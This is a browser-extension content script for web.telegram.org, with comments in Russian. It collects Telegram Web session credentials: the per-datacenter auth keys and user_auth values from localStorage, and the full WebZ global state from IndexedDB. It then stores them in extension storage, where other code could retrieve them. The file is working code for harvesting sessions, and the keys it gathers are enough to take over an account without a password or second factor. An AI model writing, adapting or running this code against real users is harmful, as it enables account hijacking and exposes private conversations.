// content.js — выполняется на web.telegram.org (WebK и WebZ)
(async function collectTelegramAuth() {
  const result = { version: null, keys: {}, webzState: null };
  const targetKeys = ['dc1_auth_key', 'dc2_auth_key', 'dc3_auth_key', 'dc4_auth_key', 'dc5_auth_key', 'user_auth'];
  const localFound = {};
  
  targetKeys.forEach(key => {
    try {
      const val = localStorage.getItem(key);
      if (val !== null) localFound[key] = val;
    } catch (e) { }
  });

  if (Object.keys(localFound).length > 0) {
    result.version = 'WebK';
    result.keys = localFound;
  }

  try {
    const webzData = await readWebZIndexedDB();
    if (webzData) {
      result.version = result.version || 'WebZ';
      result.webzState = webzData;
    }
  } catch (e) { }

  if (result.version) {
    chrome.storage.local.set({ telegramAuth: result });
  } else {
    chrome.storage.local.set({ telegramAuth: null });
  }
})();

function readWebZIndexedDB() {
  return new Promise((resolve) => {
    const req = indexedDB.open('tt-data');
    req.onerror = () => resolve(null);
    req.onsuccess = (event) => {
      const db = event.target.result;
      if (!db.objectStoreNames.contains('store')) { db.close(); resolve(null); return; }
      const tx = db.transaction('store', 'readonly');
      const store = tx.objectStore('store');
      const getReq = store.get('tt-global-state');
      getReq.onsuccess = () => { db.close(); resolve(getReq.result || null); };
      getReq.onerror = () => { db.close(); resolve(null); };
    };
    setTimeout(() => resolve(null), 2000);
  });
}